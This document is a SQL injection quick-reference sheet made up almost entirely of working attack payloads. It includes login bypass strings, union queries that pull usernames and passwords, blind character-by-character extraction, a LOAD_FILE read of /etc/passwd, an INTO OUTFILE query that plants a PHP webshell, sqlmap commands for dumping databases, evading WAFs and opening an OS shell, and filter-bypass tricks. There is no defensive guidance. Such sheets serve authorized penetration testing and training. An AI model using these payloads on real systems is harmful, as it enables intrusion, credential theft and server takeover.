# 💉 SQL Injection Quick Reference

---

## Detection

```
'          → error? vulnerable
''         → no error → string context
1=1        → true
1=2        → false → boolean injection
1 AND SLEEP(5)--   → 5 sec delay? → time-based blind
```

---

## Comment Syntax by Database

| DB | Comment |
|----|---------|
| MySQL | `-- -` or `#` |
| MSSQL | `--` |
| Oracle | `--` |
| SQLite | `--` |
| PostgreSQL | `--` |

---

## Login Bypass Payloads

```sql
admin'--
' OR 1=1--
' OR '1'='1
admin' #
' OR 1=1#
```

---

## Union-Based — Extract Data

```sql
-- Step 1: Find number of columns
' ORDER BY 1--
' ORDER BY 2--   ← keep going until error

-- Step 2: Find which columns display
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,'test',3--

-- Step 3: Extract data
' UNION SELECT NULL,username,password FROM users--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

---

## Blind Boolean — Guess Data Character by Character

```sql
-- Is first char of password 'a'?
' AND SUBSTRING(password,1,1)='a'--

-- Is database name length > 5?
' AND LENGTH(database())>5--

-- Get database name char by char
' AND SUBSTRING(database(),1,1)='a'--
```

---

## Time-Based Blind (No Visual Output)

```sql
-- MySQL
' AND SLEEP(5)--          ← 5 sec delay = vulnerable

-- Extract (delay if true)
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

---

## Read/Write Files (MySQL)

```sql
-- Read file
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--

-- Write webshell (if write permissions)
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
```

---

## SQLmap Commands

```bash
# Detect and dump
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# POST request
sqlmap -u "http://target.com/login" --data "user=a&pass=b" --dbs

# From Burp request file
sqlmap -r request.txt --dbs

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,randomcase --level=5 --risk=3

# Get OS shell (if privileged)
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## Filter Bypass Payloads

```sql
-- Space filtered
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users

-- Quote filtered
WHERE username=0x61646d696e   ← hex for 'admin'

-- Keyword filtered
SeLeCt uSeRnAmE fRoM uSeRs    ← case variation
SEL/**/ECT                     ← comment injection
```

---

## Second-Order SQLi

Data is stored safely but later used unsafely in another query.

```
Register with username: admin'--
→ Log in as admin'--
→ Profile page runs: SELECT * FROM users WHERE username='admin'--'
→ Returns admin's data
```

---

## Quick Reference — What to Try First

```
1. Add ' → error?
2. Add ' OR 1=1-- → logged in / different response?
3. ORDER BY to find column count
4. UNION SELECT to extract data
5. If no output → try SLEEP(5) for blind
6. Run sqlmap if manual is slow
```
